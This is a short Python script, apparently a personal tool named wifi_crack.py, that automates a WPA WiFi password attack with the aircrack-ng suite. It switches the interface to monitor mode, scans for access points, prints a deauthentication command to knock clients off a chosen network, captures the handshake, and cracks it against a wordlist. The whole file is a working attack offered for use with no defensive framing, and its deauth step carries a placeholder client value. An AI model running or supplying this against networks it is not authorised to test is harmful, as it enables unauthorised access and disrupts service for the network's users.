#  sudo python3 wifi_crack.py                                    



import os
import time

interface = "wlan0"
fileName = "new"
wordlist = "/home/sohail/Documents/archive/my.txt"

def start_monitor_mode(interface):
    print(f"Starting monitor mode on {interface}")
    os.system(f"sudo airmon-ng start {interface}")
    time.sleep(3)

def check_points():
    os.system(f"airodump-ng {interface}mon")

def capture_handshake(interface, bssid, channel):
    print(f"Capturing handshake for BSSID: {bssid} on channel {channel}")
    os.system(f"sudo airodump-ng --bssid {bssid} -c {channel} -w {fileName} {interface}mon")
    time.sleep(10)

def deauth_attack(interface, bssid):
    
    print("                                      past on new terminal")
    print("                                      ")
    print("                                      ")
    print(f" sudo aireplay-ng --deauth 30 -a {bssid} -c S wlan0mon")
    print("                                      ")
    input("copy^^^^^^^^^^^^^^^^^^^^^^^^and enter")
def crack_password():
    os.system(f"sudo aircrack-ng -w {wordlist} {fileName}-01.cap")



if __name__ == "__main__":

    start_monitor_mode(interface)
    check_points()

    target_bssid = input("Enter bssid")
    target_channel = input("Enter channel ")
    print(f"{target_bssid} ")
    print(f"{target_channel} ")
    
    deauth_attack(interface, target_bssid)
    capture_handshake(interface, target_bssid, target_channel)
  
    crack_password()

    input("\n \n \n \n \n enter hit enter")

    os.system(f"airmon-ng stop {interface}mon")
